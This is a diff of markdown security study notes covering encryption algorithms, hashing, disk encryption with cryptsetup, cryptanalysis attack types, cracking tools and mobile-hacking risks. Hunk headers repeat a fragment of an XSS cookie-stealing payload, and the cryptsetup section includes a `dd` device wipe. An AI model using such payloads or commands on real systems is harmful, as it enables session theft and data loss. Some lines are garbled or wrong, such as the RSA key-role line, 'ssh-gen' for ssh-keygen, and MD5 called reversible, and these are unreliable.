+- ❗ If digital signatures are waived, vulnerable to MITM attacks
+- Enables two parties to encrypt their traffic with a shared key.
+- **Solves**: We have a symmetric encryption scheme and want to communicate. We don't want anybody else to have the key, so we can't say it out loud (or over a wire).
+
+#### Diffie–Hellman groups
+
+- Determines the strength of the key used in the Diffie-Hellman key exchange process.
+- Higher Diffie-Hellman Group numbers are more secure, but requires more computation power.
+- • Group 1 (768-bit) • Group 2 (1024-bit) • Group 5 (1536-bit) • Group 14 (2048-bit) • Group 15 (3072-bit) • Group 19 (256-bit elliptic curve) • Group 20 (384-bit elliptic curve) • Group 21 (521-bit elliptic curve) • Group 24 (2048-bit, 256 bit subgroup)
+
+#### Elliptic-curve Diffie–Hellman
+
+- Also known as • **ECDH** • **Elliptic curve Diffie Hellman**
+- Variant of the Diffie–Hellman protocol using [elliptic-curve cryptography](#ecc-elliptic-curve-cryptography)
+- 📝 Used in • [SSH](./tunneling-protocols.md#ssh-secure-shell) • [TLS 1.3](./encrypting-communication.md#tls-transport-layer-security)
+
+### ECC (Elliptic-curve cryptography)
+
+- Also known as **elliptic curve cryptosystem**
+- Using points on elliptical curve along with logarithmic problems
+- Using less processing power, smaller keys, good for mobile devices
+
+### DSA (Digital Signature Algorithm)
+
+- Asymmetric algorithm
+  - Private key tells who signed the message
+  - Public key verifies the digital signature
+- In the message exchange, each entity creates a public and private key.
+- Per [FIPS 186-5](https://doi.org/10.6028/NIST.FIPS.186-5-draft), it's not recommended for signature generation but approved for signature verification.
+
+## Symmetric vs asymmetric algorithms
+
+| Differentiator | Symmetric Key Encryption | Asymmetric Key Encryption |
+| -------------- | ------------------------ | ------------------------- |
+| **Key** | Only one key (symmetric key) is used to encrypt and decrypt | Two different cryptographic keys (asymmetric keys), called the public and the private keys, are used to encrypt and decrypt |
+| **Complexity and Speed of Execution** | Simple technique, fast encryption | More complicated process, slower |
+| **Length of key** | Smaller, usually 128, 256 and 512 bits | Much larger, e.g. recommended RSA key size is 2048 bits or higher |
+| **Common usage** | When large chunks of data need to be transferred. | Smaller transactions, primarily to authenticate and establish a secure communication channel prior to the actual data transfer. |
+| **Security** | The secret key is shared. Consequently, the risk of compromise is higher. | The private key is not shared, and the overall process is more secure as compared to symmetric encryption. |
+# Hashing algorithms
+
+- Also known as **one-way functions**, **hash functions** or **message-digest-functions**
+- Calculates unique fixed-size representation of a block of information.
+- Cannot be reversed.
+- 📝 Used for
+  - integrity e.g. when downloading a file in internet, you can compare downloaded files hash with hash given on the website to ensure the right file is downloaded
+  - storing passwords in a database by e.g. operating systems
+- **Checksum**
+  - Number created by a message digest.
+
+## Collision resistance
+
+- Property of a hash function
+- 📝 [Computationally infeasible](cryptography-overview.md#computational-infeasibility) to find two colliding inputs
+- See also [Collision attack | Cryptanalysis](./cryptanalysis.md#collision-attack)
+
+## Hash functions
+
+### MD5
+
+- 📝 Most popular message digest algorithm.
+- Takes any length of input and produces a 128-bit hash
+- Considered very insecure as it is easy to reverse with current processing power
+- Still used commonly in integrity checking e.g. file download verification
+
+### SHA
+
+- Secure Hashing Algorithms
+- 📝 Generates a cryptographically secure message digest.
+- Published by NIST (National Institute of Standards and Technology)
+- Generations
+  - **SHA-0**
+    - Withdrawn shortly after publication due to a flaw and replaced with revised SHA-1
+  - 📝 **SHA-1**
+    - Produces 160-bit digests
+    - Designated by NSA
+  - **SHA-2**
+    - Primarily SHA-256 (32-bit block words), SHA-512 (64-bit block words)
+    - Truncated versions: SHA-224, SHA-384, SHA-512/224 and SHA-512/256
+    - Designated by NSA
+  - **SHA-3**
+    - Chosen after competition by non-NSA designers
+    - Supports same hash lengths as SHA-2
+    - Internal structure differs significantly from the rest of the SHA family.
+
+### RIPEMD (RACE Integrity Primitives Evaluation Message Digest)
+
+- 160-bit hash algorithm
+- Working through 80 stages made up of 6 blocks that executes 16 times each
+- Using modulo 32 addition
+
+## HMAC
+
+- Expands either as
+  - Keyed-hash message authentication code
+  - Hash-based message authentication code
+- Uses a combination of a cryptographic key and hash function such as SHA-1 or MD5.
+- Used for authentication and integrity checks.
+- E.g. `HMAC_SHA256("key", "The quick brown fox jumps over the lazy dog") = f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8`
+- Uses **keyed hashing** to generate hashed-based MACs (HMAC).  
+  - Involves hashing a message with a • hash function and • a secret key.
+  - Message authentication codes (MACs)
+    - Cryptographic checksums
+    - Used to detect when an attacker has tampered with a message
+  - Keyed hashing vs [salted hashes](#salted-hash)
+    - Keyed hashing is against tampering, hash salting is against brute-force attacks.
+    - Salts are not assumed to be secret but keys are.
+- HMAC can provide digital signatures without PKI infrastructure
+  - Delegates the key exchange to the communicating parties
+  - Parties are responsible for establishing and using a trusted channel to agree on the key prior to communication
+
+## Hash function attacks
+
+- [Collision](./cryptanalysis.md#collision-attack)
+- [Birthday attack](./cryptanalysis.md#birthday-attack)
+- [Rainbow tables](./cryptanalysis.md#rainbow-table-attack)
+- [Brute-force attack](./cryptanalysis.md#brute-force-attack)
+
+### Hash function attack countermeasures
+
+#### Salted hash
+
+- 📝 Hash is used with salt (collection of random bits) to obscure the hash.
+- Goal is to increase protection against dictionary and brute-force attacks.
+- Usually the salt is stored along with the hash of e.g. password.
+- See also [Password cracking countermeasures](./../06-system-hacking/cracking-passwords-overview.md#password-cracking-countermeasures)
+
+#### Key stretching
+
+- Converting a key (e.g. password) to a longer and more random key to e.g. use as encryption.
+- Makes encryption stronger as it increases the time and resources for brute-force attacks.
+- Usually done by re-hashing multiple (e.g. a few million) times
+- E.g. using slow key derivation functions such as PBKDF2
 # Encrypting communication
 
 - Can happen in different layers on Internet protocol suite e.g.
@@ -10887,299 +10668,6 @@ foo='+document.cookie</script>'.`
 - Used primarily for Internet e-mail.
 - PGP is an application, whereas S/MIME is a protocol.
 - PGP can be used to encrypt not only e-mail messages but also files and entire drives.
-# Disk encryption
-
-- Encryption of all data stored on a disk.
-- Data-at-rest protection
-- Protect the data stored in the disk and ensure its confidentiality
-- 📝 Protects against someone who gains physical access to your device
-  - ❗ But does not protect from malware or from being attacked by hackers over the internet
-
-## Full Disk Encryption (FDE)
-
-- Encrypting every bit of data stored on a disk or a disk volume
-- Working similar to text-message encryption and protects data even OS is not active
-- Protects system folders, files, and MBR until valid credentials are provided at pre-boot
-
-## Disk encryption tools
-
-- [VeraCrypt](https://www.veracrypt.fr/)
-- [Symantec Drive Encryption](https://help.symantec.com/cs/SEE11.3_MS/SEEMS/v98749288_v130891549/Configuring-the-Drive-Encryption---Encryption-policy-options)
-- [BitLocker Drive Encryption](https://en.wikipedia.org/wiki/BitLocker)
-- [cryptsetup](https://gitlab.com/cryptsetup/cryptsetup)
-  - Open-source disk encryption utility tool
-  - Supports [LUKS (Linux Unified Key Setup)](https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup), TrueCrypt, VeraCrypt, BitLocker, loop-AES, dm-crypt...
-  - Encrypt
-    1. `sudo yum install cryptsetup`
-    2. Find mapped disk folder to encrypt using `sudo fdisk -l`
-    3. `sudo cryptsetup -y -v luksFormat /dev/<mapped-folder>`
-  - Decrypt
-    - `sudo cryptsetup luksOpen /dev/<mapped-folder> <new-name>`
-      - Will map unencrypted device to `/dev/mapper/<new-name>` (check `fdisk -l`)
-    - More information about encryption method etc:
-      - `sudo cryptsetup status <new-name>`
-      - or `sudo cryptsetup luksDump /dev/<mapped-folder>`
-    - Reformat device:
-      - Clear: `sudo dd if=/dev/zero of=/dev/mapper/<mapped-folder> bs=128`
-      - Create file system: `sudo mkfs.ext4 /dev/mapper/<mapped-folder>`
-    - Mount: `sudo mount /dev/mapper/<mapped-folder> <mountad-name>/`
-# Encryption algorithms and techniques
-
-- **Algorithm**: step-by-step method of solving a problem
-- **Encryption algorithms**: mathematical formulas used to encrypt and decrypt data
-- Keys should still change on a regular basis even though they may be "unhackable"
-- 📝 In terms of speed
-  - Symmetric encryption algorithms are faster than asymmetric algorithms
-  - Stream ciphers (including AES in CTR) are [usually faster](https://crypto.stackexchange.com/a/31281) than [hash functions](./hashing-algorithms.md#hash-functions)
-
-## Encryption types per OSI layer
-
-| [OSI layer](./../03-scanning-networks/tcpip-basics.md#osi-model) | Encryption type | Description |
-|:---------:| --------------- | ----------- |
-| 2 | Link encryption | Everything including original headers is encrypted |
-| 3 | Network encryption | Everything in the packet is encrypted |
-| 4 | Protocol encryption | Specific protocols are entirely encrypted e.g. [SSL](./encrypting-communication.md#ssl-secure-sockets-layer) |
-| 5 | Service based encryption | Encryption for specific services on specific hosts |
-| 6 | Data encryption | |
-| 7 | Application based information encryption | |
-
-## Symmetric algorithms
-
-- Both ends of the transmission must use the same key.
-  - Requires to find a secondary secure channel to send the symmetric key to the recipient to ensure security.
-
-### DES (Data Encryption Standard)
-
-- Block cipher, 56-bit key, 64-bit block size
-- Developed in the early 1970s at IBM
-- Was a standard set by NSA but was withdrawn, quickly outdated
-- Used in initial implementation of Kerberos but later deprecated
-- Considered insecure, has been superseded by the [Advanced Encryption Standard (AES)](#aes-advanced-encryption-standard)
-
-### 3DES (Triple Data Encryption Standard)
-
-- Block cipher, 168-bit key
-- More effective than DES but much slower
-- 3 keys are used:
-  1. Used to encrypt the plain text
-  2. Used to decrypt ciphertext resulting from the first round of encryption
-  3. Used to encrypt the ciphertext that resulted from the decryption with the 2nd key
-
-### AES (Advanced Encryption Standard)
-
-- Iterated block cipher, 128, 192 or 256 bit key, 128-bit block size
-- Original name is **Rijndael**, named to AES after [Advanced Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process) contest.
-- Symmetric-key algorithm
-- Performs same operation multiple size
-- Approved and used by NSA
-- Much faster than DES and 3DES for bulk data encryption.
-
-### RC (Rivest Cipher)
-
-- 📝 Symmetric-key algorithm.
-- Lost to [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process) in [Advanced Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process) contest.
-
-#### RC4
-
-- Variable length key algorithm
-- Uses random permutations
-- Stream cipher
-
-#### RC5
-
-- Parameterized algorithm
-- Block cipher (slower)
-- Variable
-  - block size: can be 32, 64, or 128 bits
-  - key size: between 0 and 2048 bits
-  - number of rounds: between 0 and 255
-
-#### RC6
-
-- Extends RC5 with two features
-  1. integer multiplication
-  2. 4-bit registers (RC5 uses 2-bit registers)
-
-### Blowfish
-
-- Fast symmetric block cipher, 64-bit block size, 32 to 448 bits key
-- Considered public domain
-- Insecure
-
-### Twofish
-
-- Symmetric-key block cipher
-- Uses 128-bit blocks
-- Key size can range between 0 and 256 bits.
-- Lost to [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process) as finalist in [Advanced Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process) contest.
-
-## Asymmetric algorithms
-
-### RSA (Rivest–Shamir–Adleman)
-
-- One of the common used encryption standards for data transmission.
-- 📝 Achieving strong encryption through the use of two large prime numbers
-- **Solves**
-  - I want anybody to be able to encrypt a message, but I'm the only one who can decrypt it. I don't want to share decryption keys with anybody.
-- There are no published methods to defeat the system if a large enough key is used.
-- Wide usage, e.g. SSH for public key authentication
-  - A lot safer than password authentication (should be disabled after copying keys)
-  - Steps
-    1. `ssh-gen -t rsa` creates private and public keys in `.ssh` folder
-    2. Copy the key to server to be connected
-       - Can run e.g. `ssh-copy-id user@192.168.122.37` with ssh password
-       - Or just copy `~/.ssh/id_rsa.pub` to the server manually.
-- 💡 In RSA crypto, when you generate a key pair, it's completely arbitrary which one you choose to be the public key, and which is the private key.
-  - If you encrypt with one, you can decrypt with the other - it works in both directions.
-  - When encrypting, private key is used to decrypt and public key to decrypt
-    - "I want to be able to encrypt certain information and use it as a product key for my software."
-  - When signing, private key is used to encrypt and public key to decrypt
-    - "I want to use my private key to generate messages so only I can possibly be the sender."
-- Recommended key size is 2048 bits or higher.
-- 🤗 [RSA Factoring Challenge](https://en.wikipedia.org/wiki/RSA_Factoring_Challenge)
-  - Held between 1991 and 2007 with price awards
-  - Goal was to factoring prime numbers used by RSA
-  - Shows cryptanalytic strength of RSA
-
-### Diffie–Hellman
-
-- Also known as **Diffie Hellman** or **DH**
-- Used for generating a shared key between two entities over an insecure channel.
-- One of the first public-key protocols
-- 📝 Used in • [SSL](./encrypting-communication.md#ssl-secure-sockets-layer) • [IKE (Internet Key Exchange) | IPsec](./tunneling-protocols.md#ike-internet-key-exchange)
-- ❗ If digital signatures are waived, vulnerable to MITM attacks
-- Enables two parties to encrypt their traffic with a shared key.
-- **Solves**: We have a symmetric encryption scheme and want to communicate. We don't want anybody else to have the key, so we can't say it out loud (or over a wire).
-
-#### Diffie–Hellman groups
-
-- Determines the strength of the key used in the Diffie-Hellman key exchange process.
-- Higher Diffie-Hellman Group numbers are more secure, but requires more computation power.
-- • Group 1 (768-bit) • Group 2 (1024-bit) • Group 5 (1536-bit) • Group 14 (2048-bit) • Group 15 (3072-bit) • Group 19 (256-bit elliptic curve) • Group 20 (384-bit elliptic curve) • Group 21 (521-bit elliptic curve) • Group 24 (2048-bit, 256 bit subgroup)
-
-#### Elliptic-curve Diffie–Hellman
-
-- Also known as • **ECDH** • **Elliptic curve Diffie Hellman**
-- Variant of the Diffie–Hellman protocol using [elliptic-curve cryptography](#ecc-elliptic-curve-cryptography)
-- 📝 Used in • [SSH](./tunneling-protocols.md#ssh-secure-shell) • [TLS 1.3](./encrypting-communication.md#tls-transport-layer-security)
-
-### ECC (Elliptic-curve cryptography)
-
-- Also known as **elliptic curve cryptosystem**
-- Using points on elliptical curve along with logarithmic problems
-- Using less processing power, smaller keys, good for mobile devices
-
-### DSA (Digital Signature Algorithm)
-
-- Asymmetric algorithm
-  - Private key tells who signed the message
-  - Public key verifies the digital signature
-- In the message exchange, each entity creates a public and private key.
-- Per [FIPS 186-5](https://doi.org/10.6028/NIST.FIPS.186-5-draft), it's not recommended for signature generation but approved for signature verification.
-
-## Symmetric vs asymmetric algorithms
-
-| Differentiator | Symmetric Key Encryption | Asymmetric Key Encryption |
-| -------------- | ------------------------ | ------------------------- |
-| **Key** | Only one key (symmetric key) is used to encrypt and decrypt | Two different cryptographic keys (asymmetric keys), called the public and the private keys, are used to encrypt and decrypt |
-| **Complexity and Speed of Execution** | Simple technique, fast encryption | More complicated process, slower |
-| **Length of key** | Smaller, usually 128, 256 and 512 bits | Much larger, e.g. recommended RSA key size is 2048 bits or higher |
-| **Common usage** | When large chunks of data need to be transferred. | Smaller transactions, primarily to authenticate and establish a secure communication channel prior to the actual data transfer. |
-| **Security** | The secret key is shared. Consequently, the risk of compromise is higher. | The private key is not shared, and the overall process is more secure as compared to symmetric encryption. |
-# Hashing algorithms
-
-- Also known as **one-way functions**, **hash functions** or **message-digest-functions**
-- Calculates unique fixed-size representation of a block of information.
-- Cannot be reversed.
-- 📝 Used for
-  - integrity e.g. when downloading a file in internet, you can compare downloaded files hash with hash given on the website to ensure the right file is downloaded
-  - storing passwords in a database by e.g. operating systems
-- **Checksum**
-  - Number created by a message digest.
-
-## Collision resistance
-
-- Property of a hash function
-- 📝 [Computationally infeasible](cryptography-overview.md#computational-infeasibility) to find two colliding inputs
-- See also [Collision attack | Cryptanalysis](./cryptanalysis.md#collision-attack)
-
-## Hash functions
-
-### MD5
-
-- 📝 Most popular message digest algorithm.
-- Takes any length of input and produces a 128-bit hash
-- Considered very insecure as it is easy to reverse with current processing power
-- Still used commonly in integrity checking e.g. file download verification
-
-### SHA
-
-- Secure Hashing Algorithms
-- 📝 Generates a cryptographically secure message digest.
-- Published by NIST (National Institute of Standards and Technology)
-- Generations
-  - **SHA-0**
-    - Withdrawn shortly after publication due to a flaw and replaced with revised SHA-1
-  - 📝 **SHA-1**
-    - Produces 160-bit digests
-    - Designated by NSA
-  - **SHA-2**
-    - Primarily SHA-256 (32-bit block words), SHA-512 (64-bit block words)
-    - Truncated versions: SHA-224, SHA-384, SHA-512/224 and SHA-512/256
-    - Designated by NSA
-  - **SHA-3**
-    - Chosen after competition by non-NSA designers
-    - Supports same hash lengths as SHA-2
-    - Internal structure differs significantly from the rest of the SHA family.
-
-### RIPEMD (RACE Integrity Primitives Evaluation Message Digest)
-
-- 160-bit hash algorithm
-- Working through 80 stages made up of 6 blocks that executes 16 times each
-- Using modulo 32 addition
-
-## HMAC
-
-- Expands either as
-  - Keyed-hash message authentication code
-  - Hash-based message authentication code
-- Uses a combination of a cryptographic key and hash function such as SHA-1 or MD5.
-- Used for authentication and integrity checks.
-- E.g. `HMAC_SHA256("key", "The quick brown fox jumps over the lazy dog") = f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8`
-- Uses **keyed hashing** to generate hashed-based MACs (HMAC).  
-  - Involves hashing a message with a • hash function and • a secret key.
-  - Message authentication codes (MACs)
-    - Cryptographic checksums
-    - Used to detect when an attacker has tampered with a message
-  - Keyed hashing vs [salted hashes](#salted-hash)
-    - Keyed hashing is against tampering, hash salting is against brute-force attacks.
-    - Salts are not assumed to be secret but keys are.
-- HMAC can provide digital signatures without PKI infrastructure
-  - Delegates the key exchange to the communicating parties
-  - Parties are responsible for establishing and using a trusted channel to agree on the key prior to communication
-
-## Hash function attacks
-
-- [Collision](./cryptanalysis.md#collision-attack)
-- [Birthday attack](./cryptanalysis.md#birthday-attack)
-- [Rainbow tables](./cryptanalysis.md#rainbow-table-attack)
-- [Brute-force attack](./cryptanalysis.md#brute-force-attack)
-
-### Hash function attack countermeasures
-
-#### Salted hash
-
-- 📝 Hash is used with salt (collection of random bits) to obscure the hash.
-- Goal is to increase protection against dictionary and brute-force attacks.
-- Usually the salt is stored along with the hash of e.g. password.
-- See also [Password cracking countermeasures](./../06-system-hacking/cracking-passwords-overview.md#password-cracking-countermeasures)
-
-#### Key stretching
-
-- Converting a key (e.g. password) to a longer and more random key to e.g. use as encryption.
-- Makes encryption stronger as it increases the time and resources for brute-force attacks.
-- Usually done by re-hashing multiple (e.g. a few million) times
-- E.g. using slow key derivation functions such as PBKDF2
 # Tunneling protocols
 
 - Allows for the movement of data from one network to another
@@ -11271,6 +10759,231 @@ foo='+document.cookie</script>'.`
 
 - Insecure/obsolete method for implementing virtual private networks
 - Uses a TCP control channel and a Generic Routing Encapsulation tunnel to encapsulate PPP packets.
+# Disk encryption
+
+- Encryption of all data stored on a disk.
+- Data-at-rest protection
+- Protect the data stored in the disk and ensure its confidentiality
+- 📝 Protects against someone who gains physical access to your device
+  - ❗ But does not protect from malware or from being attacked by hackers over the internet
+
+## Full Disk Encryption (FDE)
+
+- Encrypting every bit of data stored on a disk or a disk volume
+- Working similar to text-message encryption and protects data even OS is not active
+- Protects system folders, files, and MBR until valid credentials are provided at pre-boot
+
+## Disk encryption tools
+
+- [VeraCrypt](https://www.veracrypt.fr/)
+- [Symantec Drive Encryption](https://help.symantec.com/cs/SEE11.3_MS/SEEMS/v98749288_v130891549/Configuring-the-Drive-Encryption---Encryption-policy-options)
+- [BitLocker Drive Encryption](https://en.wikipedia.org/wiki/BitLocker)
+- [cryptsetup](https://gitlab.com/cryptsetup/cryptsetup)
+  - Open-source disk encryption utility tool
+  - Supports [LUKS (Linux Unified Key Setup)](https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup), TrueCrypt, VeraCrypt, BitLocker, loop-AES, dm-crypt...
+  - Encrypt
+    1. `sudo yum install cryptsetup`
+    2. Find mapped disk folder to encrypt using `sudo fdisk -l`
+    3. `sudo cryptsetup -y -v luksFormat /dev/<mapped-folder>`
+  - Decrypt
+    - `sudo cryptsetup luksOpen /dev/<mapped-folder> <new-name>`
+      - Will map unencrypted device to `/dev/mapper/<new-name>` (check `fdisk -l`)
+    - More information about encryption method etc:
+      - `sudo cryptsetup status <new-name>`
+      - or `sudo cryptsetup luksDump /dev/<mapped-folder>`
+    - Reformat device:
+      - Clear: `sudo dd if=/dev/zero of=/dev/mapper/<mapped-folder> bs=128`
+      - Create file system: `sudo mkfs.ext4 /dev/mapper/<mapped-folder>`
+    - Mount: `sudo mount /dev/mapper/<mapped-folder> <mountad-name>/`
+# Cryptanalysis
+
+- Process of decryption of ciphers and encrypted text
+- Identifies vulnerabilities in cryptosystems
+
+## Cryptanalytic techniques
+
+### Linear cryptanalysis
+
+- Known as **plaintext attack**
+- Applicable to block ciphers and stream ciphers.
+- Given enough pairs of plaintext and corresponding ciphertext, key can be obtained
+- Discovered by By Matsui and Yamagishi in 1992
+- Attacker identifies the linear relation between some bits of the plaintext, some bits of the ciphertext and some bits of the unknown key.
+
+### Differential cryptanalysis
+
+- Discovered by Israeli researchers Eli Biham and Adi Shamir in the late 1980s.
+- Applicable primarily to block ciphers, but also to stream ciphers and cryptographic hash functions.
+- Applicable to symmetric key algorithms
+- Comparing differences in the inputs to how each one affects the outcome
+- Working with chosen plaintext originally, also works with known plaintext and ciphertext
+
+### Integral cryptanalysis
+
+- Used on block ciphers
+- Discovered by Lars Knudsen in 1997
+- Input vs Output comparison same as differential, however, runs multiple computations of the same block size input
+- Attacker analyzes outputs of encrypting sets of plaintexts where some of the content is held constant and some of the content is varied through all possibilities
+
+## Code-breaking methodologies
+
+- **Frequency analysis**
+  - Study of the frequency of letters or groups of letters in a ciphertext
+  - E.g. checking cipher chunks against in languages some letters or combination of letters are used more often
+  - Can be used to crack a substitution cipher, like rotation cipher ROT13
+- **Trickery and deceit**
+  - Requires a high level of mathematical and cryptographic skills
+  - Using [social engineering techniques](./../10-social-engineering/social-engineering-types.md) to trick someone to encrypt and send a known message
+- **One-time pad**
+  - A shared random key that has to be the same length or longer than the cipher text
+  - Each individual bit or character of plaintext is encrypted by combining it with the corresponding bit or character from the pad using modular addition
+  - Assuming to be unbreakable
+  - **Drawback**
+    - Key distribution becomes impracticable for large messages as key length is same as as the messages
+
+## Cryptography attacks
+
+### Chosen-key Attack
+
+- 📝 Attacker knows keys that are used or can choose the secret key.
+- May allow breaking the larger system which relies on that cipher
+
+### Rubber-hose attack
+
+- Also known as **rubber hose** or **rubberhose** attack.
+- 📝 Extraction of cryptographic secrets (e.g. the password to an encrypted file) from a person by coercion or torture
+- E.g. beating that person with a rubber hose until they give up the encryption key.
+
+### Ciphertext-only attack (COA)
+
+- Also known as **known ciphertext attack**
+- 📝 Attacker has only access to cipher texts
+- E.g. using frequency analysis to assume plain text
+- Early ciphers (using pen-and-paper) were cracked this way
+- Modern ciphers have strong protections against it
+  - take years to separate statistical departure from random noise
+
+### Known-plaintext attack (KPA)
+
+- Also known as **known-plain-text attack**
+- 📝 Attacker has access to parts of plaintext and corresponding ciphertext.
+- Can be used to reveal secret keys, code books.
+- Classical ciphers are typically vulnerable
+
+#### Meet-in-the-middle attack
+
+- Also known as **meet in the middle attack**.
+- Attack over certain block ciphers by decomposing the problem in two halves and proceeds on each part separately
+- Reduces the effort to perform a brute-force attack
+- 📝 Reason why re-encrypting an ciphertext reduces its security
+  - The reason that Triple DES or Double DES is considered weak and are no longer used.
+- E.g. transforming an attack that requires `2exp128` time into one that takes `2exp64` time and `2exp64` space
+- Type of known-plaintext attack
+
+### Chosen-plaintext attack (CPA)
+
+- 📝 Attacker can choose random plaintexts to be encrypted and obtain the corresponding ciphertexts
+- 📝 Two forms
+  - **Batch chosen-plaintext attack**
+    - Cryptanalyst chooses all plaintexts before any of them are encrypted.
+    - Not so effective
+  - **Adaptive chosen-plaintext attack**
+    - Cryptanalyst makes a series of interactive queries
+    - Subsequent plaintexts are chosen based on the information from the previous encryptions.
+
+### Chosen-ciphertext attack (CCA)
+
+- Also known as **chosen ciphertext attack** or **chosen-cipher-text attack**.
+- Attacker gathers information by obtaining the decryptions of chosen ciphertexts.
+- Early versions of RSA padding used in the SSL protocol were vulnerable.
+- Types
+  - **Adaptive chosen-ciphertext (CCA2)**
+    - Attacker uses the results from prior decryptions to inform their choices of which ciphertexts to have decrypted
+  - **Non-adaptive chosen-ciphertext**
+    - Attacker chooses the ciphertexts to have decrypted without seeing any of the resulting plaintexts
+  - **Lunchtime attack** or **midnight attack**
+    - Attacker can have access to system for only a limited amount of time, can access only few plaintext-ciphertext pairs
+
+### Side-channel attacks
+
+- Based on information gained from a computer, rather than weaknesses in the algorithm itself.
+- Monitors environmental factors such as power consumption, sound, timing and delay.
+- E.g. [RSA keys can be revealed by listening to CPU work](https://www.pcworld.com/article/2082200/listen-up-rsa-keys-snatched-by-recording-cpu-sounds-with-a-phone.html).
+
+#### Timing attack
+
+- Execution times are measured to learn more about the system
+- Information to find can include e.g. key, CPU used, algorithms, input, implementation details etc.
+- A type of side-channel attack
+
+### Brute-force attack
+
+- Also known as **brute force**
+- Trying every possible combination of characters to break the encryption
+- 📝 ❗️ Requires a lot of time and processing power.
+- See also [Brute-force attack | Cracking passwords](./../06-system-hacking/cracking-passwords-overview.md#brute-force-attack)
+
+#### Birthday Attack
+
+- Type of [brute-force](#brute-force-attack) attack but faster that focuses on collisions
+- Based on collisions where attacker uses own plain texts to match hashes (find collisions)
+- Depends on the higher likelihood of collisions found between random attack attempts and a fixed degree of permutations
+- Exploits [birthday problem](https://en.wikipedia.org/wiki/Birthday_problem) in probability theory
+  - E.g. 23 people in room, chance of two having same birthday is not `23 / 365 = ≈6%` but it's 50%. For 75 people it's 99% chance.
+
+#### Rainbow table attack
+
+- 📝 Rainbow table contains precomputed hashes to try and find out passwords
+- Faster than [brute-force](#brute-force-attack) however the trade-off is that it takes a lot of storage (sometimes Terabytes) to hold the Rainbow Tables themselves.
+- Tools
+  - [HashCalc](https://www.slavasoft.com/hashcalc/)
+  - [MD5 Calculator](http://onlinemd5.com/)
+
+### Dictionary attack
+
+- Attacker creates and uses a dictionary of plaintext and its ciphertext.
+- E.g. words in a dictionary
+- E.g. previously used passwords, often from lists obtained from past security breaches
+  - See also [Dictionary attacks | Cracking passwords](./../06-system-hacking/cracking-passwords-overview.md#dictionary-attack)
+
+### Related-key attack
+
+- Attacker observes the operation of a cipher under several different keys
+- Some relationship connecting the keys is known to attacker while key values are unknown.
+- E.g. attacker knows that last 80 bits of the keys are the same
+
+### DUHK Attack (Don't Use Hard-Coded Keys)
+
+- Allowing attackers to access keys and read communications in certain VPN implementations
+- Based on vulnerability affecting devices using ANSI X9.31 Random Number Generator (RNG) with a hard-coded seed key
+
+### Collision attack
+
+- Also known as **hash collision attack**
+- 📝 Tries to find two inputs resulting in same hash value, i.e. a hash collision.
+  - Find two different messages `m1` and `m2` such that `hash(m1) = hash(m2)`.
+- Extended by **chosen-prefix collision attack**
+  - Given two different prefixes `p1`, `p2`
+    - The attack finds two appendages `m1` and `m2` such that `hash(p1 ∥ m1) = hash(p2 ∥ m2)`
+      - where `∥` is the concatenation operation.
+  - More powerful
+- 💡 The larger the hash value size, the less likely there are for collisions to occur and therefore the more [collision resistant](./hashing-algorithms.md#collision-resistance) the hash algorithm
+
+## Cryptography attack tools
+
+- [L0phtcrack](https://www.l0phtcrack.com/)
+  - Password cracking tool
+  - Used mainly against Windows [SAM files](./../06-system-hacking/microsoft-authentication.md)
+- 📝 [John the Ripper](https://www.openwall.com/john/)
+  - Password cracking tool
+  - Can run against hashed/encrypted passwords of OSes, databases etc.
+  - See also [John the Ripper | Password cracking tools](./../06-system-hacking/password-cracking-tools.md#john-the-ripper)
+- [CrypTool](https://www.cryptool.org/en/)
+  - Open-source program for for cryptography and cryptanalysis
+  - GUI to experiment with cryptographic procedures and to animate their cascades
+- [Cryptobench](http://www.addario.org/cryptobench/)
+  - Encrypt, decrypt, hash using many algorithms
+  - Helps in the cryptanalysis process of common cryptographic schemes
 # Cloud computing
 
 - Cloud computing = On-demand access to IT capabilities
@@ -11760,6 +11473,80 @@ foo='+document.cookie</script>'.`
   - Unupdated/stale images might be vulnerable
 - **Never-ever as root**
   - Run in [rootless mode](https://docs.docker.com/engine/security/rootless/) (as non root)
+# Mobile hacking
+
+## Motivations
+
+- **Surveillance**: • Audio • Camera • Call logs • Location • SMS messages
+- **Financial**: • sending high rate SMS • stealing transaction authentication numbers (TANs) • extortion via ransomware • fake antivirus • making expensive calls
+- **Data theft**: • Account details • Contacts • Call logs • phone number • stealing IMEI
+- **Botnet activity**: • launching DDoS attacks • click fraud • sending SMS
+- **Impersonation**: • SMS redirection, sending e-mail messages, posting to social media
+
+## Attack vectors
+
+- Malware
+- Data exfiltration
+- Data tampering
+- Data loss
+
+## Vulnerabilities and risks
+
+- Malicious apps in stores
+- Mobile malware
+- App sandboxing vulnerabilities
+- Weak device and app encryption
+- OS and app update issues
+- Jailbreaking and rooting
+- Mobile application vulnerabilities
+- Privacy issues (Geolocation)
+- Weak data security
+- Excessive permissions
+- Weak communication security
+- Physical attacks
+- Insufficient code obfuscation
+- Insufficient transport layer security
+- Insufficient session expiration
+
+## Security issues from App Stores
+
+- Used to distribute malware/malicious apps
+- App: Software that runs on mobile devices
+- App Store: Distribution platform
+  - Can be from owners of the OS e.g. Apple, Google play, Microsoft.
+  - Or third parties e.g. Amazon Appstore, GetJar, and APKMirror.
+- Can be distributed through
+  - legitimate app stores
+    - because of insufficient or no vetting of apps
+  - unofficial app stores
+    - user is social engineered to download and execute
+
+## Sandboxing
+
+- App sandboxing
+  - Limits resources available to an app
+  - Isolates one from another
+  - ❗ A vulnerable one can still be exploited
+
+## Mobile spam
+
+- Also known as SMS spam, text spam, or m-spam
+- Advertisements or malicious links
+- E.g. you've won a prize, click here to claim it.
+
+## SMiShing
+
+- SMS phishing
+- Acquire personal information through SMS with malicious links
+- Effective as
+  - Easy through e.g. using prepaid SMS card using fake identity
+  - Usually not checked by antiviruses
+  - Users are not familiar
+- E.g. "PayPal - your account has been locked"
+
+## Pairing
+
